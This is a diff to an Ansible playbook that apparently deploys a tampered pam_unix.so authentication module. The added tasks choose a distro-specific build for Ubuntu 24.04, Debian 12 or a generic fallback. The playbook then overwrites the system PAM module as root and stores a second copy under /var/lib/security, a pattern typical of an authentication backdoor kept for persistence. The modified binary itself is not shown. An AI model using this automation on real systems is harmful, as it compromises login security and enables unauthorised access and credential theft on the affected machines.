@@ -1,4 +1,30 @@
 ---
+- name: Gather OS facts
+  ansible.builtin.setup:
+    gather_subset:
+      - '!all'
+      - '!min'
+      - distribution
+
+- name: Set distro-specific file path for Ubuntu 24.04
+  ansible.builtin.set_fact:
+    pam_file_src: "ubuntu-24.04/pam_unix_ubuntu24.so"
+  when: 
+    - ansible_distribution == "Ubuntu"
+    - ansible_distribution_version == "24.04"
+
+- name: Set distro-specific file path for Debian 12
+  ansible.builtin.set_fact:
+    pam_file_src: "debian-12/pam_unix_debian12.so"
+  when:
+    - ansible_distribution == "Debian"
+    - ansible_distribution_major_version == "12"
+
+- name: Set generic file path for other distros
+  ansible.builtin.set_fact:
+    pam_file_src: "pam_unix_deb.so"
+  when: pam_file_src is not defined
+
 - name: Check if deploy has been run before and backup exists
   ansible.builtin.stat:
     path: /usr/lib/pam.d/pam_unix.so
@@ -13,7 +39,7 @@
 
 - name: Copy over modified pam_unix.so
   ansible.builtin.copy:
-    src: pam_unix.so
+    src: "{{ pam_file_src }}"
     dest: /usr/lib/x86_64-linux-gnu/security/pam_unix.so
     owner: root
     group: root
@@ -27,7 +53,7 @@
 
 - name: Copy over modified file to backup backup directory
   ansible.builtin.copy:
-    src: pam_unix.so
+    src: "{{ pam_file_src }}"
     dest: /var/lib/security/pam_unix.so
     owner: root
     group: root
